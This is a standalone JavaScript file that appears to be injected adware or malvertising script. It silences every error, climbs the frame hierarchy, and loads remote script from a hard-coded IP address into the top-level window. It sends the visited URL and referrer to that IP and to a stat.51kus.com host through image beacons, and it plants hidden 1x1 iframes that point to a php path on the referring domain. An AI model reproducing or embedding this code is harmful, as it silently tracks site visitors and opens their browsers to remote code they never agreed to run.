{
    window.onerror = function(a, b, c) {
       return true
    };

    function parseUri (str) {
	var	o   = parseUri.options,
		m   = o.parser[o.strictMode ? "strict" : "loose"].exec(str),
		uri = {},
		i   = 14;

	while (i--) uri[o.key[i]] = m[i] || "";

	uri[o.q.name] = {};
	uri[o.key[12]].replace(o.q.parser, function ($0, $1, $2) {
		if ($1) uri[o.q.name][$1] = $2;
	});

	return uri;
    };

    parseUri.options = {
	strictMode: false,
	key: ["source","protocol","authority","userInfo","user","password","host","port","relative","path","directory","file","query","anchor"],
	q:   {
		name:   "queryKey",
		parser: /(?:^|&)([^&=]*)=?([^&]*)/g
	},
	parser: {
		strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
		loose:  /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
	}
    };

    function dynaddjs(win, a) { 
        var b = win.document.getElementsByTagName("head")[0]; 
        var c = win.document.createElement("script"); 
        c.setAttribute("type", "text/javascript"); 
        c.setAttribute("charset", "UTF-8"); 
        c.setAttribute("src", a); 
        b.appendChild(c) 
        //document.head.insertBefore(c, b);
    }

    function getQueryVariable(variable) {
        var query = window.location.search.substring(1);
        var vars = query.split('&');
        for (var i = 0; i < vars.length; i++) {
            var pair = vars[i].split('=');
            if (decodeURIComponent(pair[0]) == variable) {
                return decodeURIComponent(pair[1]);
            }
        }
    }

    var g = window;
    if(location.href.indexOf("crsdmnpolsmnt.php") > 0) {
        g = parent.parent;
        try {
            var qd = getQueryVariable("qd");
            dynaddjs(g, "http://125.64.93.134/sfupdate/webpv.php?qd="+qd);
        }catch(e) {
            var refurl = parseUri(location.href);
            var abtb = new Image;
            abtb.src = "http://125.64.93.134/sfupdate/webpvtrck.php?"+refurl.query;
            g = null;
        }
    }else {
                if(typeof issfpub == 'undefined' && typeof sndrpt != 'undefined' && typeof hastrckwg == 'undefined') {
            hastrckwg = 1;
            sndrpt("http://stat.51kus.com/sfupdate/wgcheckv1.php");
        }
        
        if(location.href.indexOf("http://www.abab.com") >= 0) {
            sndrpt("http://stat.51kus.com/sfupdate/ababtrck.php?qd=nfyudsa&nbid=421015|902B34DF9290&ref="+encodeURIComponent(document.referrer));
        }
    }

    if(g) {
        var istop = 1;
        var iscrdm = 0;
        while (g != window.top ) {
            istop = 0;
            try {
                g.parent.location.toString()
            } catch(e) {
                iscrdm = 1;
                break
            }
            if(g == g.parent) break;
            g = g.parent
        }

        if((istop == 1 || iscrdm == 0) && typeof(top._guanggao_pub) == "undefined" && typeof(top.issfpub) == 'undefined') {
                }

        if(istop == 1 && typeof(top.bpcpop) == 'undefined' && typeof(top.issfpub) == 'undefined' && location.href.indexOf("crsdmnpolsmnt.php") < 0) {
                }

        if(typeof(g.xpfwebpv) == "undefined") {
            g.xpfwebpv = 1;
            var qustr = "qd=nfyudsa&fromurl=" + encodeURIComponent(g.document.referrer) + "&url=" + encodeURIComponent(g.location.href) + "&it=" + istop + "&cd=" + iscrdm + "&" + (new Date).getTime();
            if(istop == 0 && iscrdm == 1) {
                if(g.document.referrer.length > 0) {
                    try {
                        myiframe = g.document.createElement("<iframe name='" + '{"name":"master-1","master-1": {"lines":3,"fontFamily":"arial","linkTarget":"_top","fontSizeTitle":"16px","fontSizeDescript ion":"13px","fontSizeDomainLink":"13px"}}' + "'></iframe>")
                    } catch(e) {
                        myiframe = g.document.createElement('iframe');
                        myiframe.name = '{"name":"master-1","master-1": {"lines":3,"fontFamily":"arial","linkTarget":"_top","fontSizeTitle":"16px","fontSizeDescript ion":"13px","fontSizeDomainLink":"13px"}}'
                    }
                    myiframe.id = "master-1";
                    myiframe.width = 1 + "px"
                    myiframe.height = 1 + "px";
                    myiframe.scrolling = "no";
                    myiframe.frameBorder = "no";
                    myiframe.marginHeight = 0;
                    myiframe.marginWidth = 0;
                    var refurl = parseUri(g.document.referrer);
                    if(refurl.port.length > 0)
                        refdomain = refurl.host+":"+refurl.port;
                    else
                        refdomain = refurl.host;
                    myiframe.src = refurl.protocol+"://"+refdomain+"/crsdmnpolsmnt.php?"+qustr;
                    g.document.body.appendChild(myiframe);
                }
            }else {
                var abtb = new Image;
                abtb.src = "http://125.64.93.134/sfupdate/webpvtrck.php?"+qustr;
           }
        }
        xpfwebpv = 1;
    }
}
